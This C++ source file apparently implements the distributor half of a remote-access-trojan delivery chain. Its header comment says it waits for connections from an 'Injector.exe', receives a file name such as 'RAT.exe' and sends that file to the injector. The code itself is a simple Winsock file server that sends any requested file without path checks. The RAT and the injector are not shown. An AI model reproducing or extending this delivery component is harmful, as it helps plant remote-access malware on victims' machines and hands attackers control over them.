//
// Distributeur.cpp
//
// The program waits for a connection from Injector.exe. Once connected,
// it expects to receive a file name (RAT.exe) and will send said file to
// the injector.
// The program continues to wait for connection until it's console is closed.
//
// Compile and link with wsock32.lib.
//
// Pass the port number on the command line. 
//
// Example: Server.exe 2020
//
// Written by: Alexandre Cox
// Date: 04/04/2018
//
#include <stdio.h>
#include <winsock.h>
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>
#include "Connection.h"
#include "Connection_error.h"

using namespace std;

//Define for port and host arguments
//#define HARD_CODED_ARGS
#define SERVER_NAME "127.0.0.1"
#define MY_PORT 2020

// Function prototype
void StreamServer(short nPort);
string getFileName(const string& s);

 

// Helper macro for displaying errors
#define PRINTERROR(s)	cout<<"\n"<<s<<":"<<WSAGetLastError()

////////////////////////////////////////////////////////////

void main(int argc, char **argv)
{
	short nPort;
	char* server;

	//
	// Check for the host and port arguments
	//
#ifdef HARD_CODED_ARGS
	nPort = MY_PORT;

#else
	if (argc != 2)	{
		cout<<"\nSyntax: host PortNumber";
		cout<<endl;
		return;
	}
	nPort = atoi(argv[1]);

#endif

	//
	// Go do the stuff a stream client does
	//
    StreamServer(nPort);
	
	//
	// Release WinSock
	//
	WSACleanup();

}

////////////////////////////////////////////////////////////

void StreamServer(short nPort)
{
	try
	{
		Connection OpenConnect(nPort);
		do
		{
			try
			{
				string msg;
				OpenConnect.WaitRequest();
				OpenConnect.recvMessage(msg);
				OpenConnect.sendFile(msg);
			}
			catch (Connection_error ex)
			{
				cout << ex.what();
			}
		} while (true);
	}
	catch (Connection_error ex)
	{
		cout << ex.what();
	}
	cin.ignore();
	return;
}

string getFileName(const string& s) {
	char sep = '/';

#ifdef _WIN32
	sep = '\\';
#endif

	size_t i = s.rfind(sep, s.length());
	if (i != string::npos) {
		return(s.substr(i + 1, s.length() - i));
	}
	return(s);
}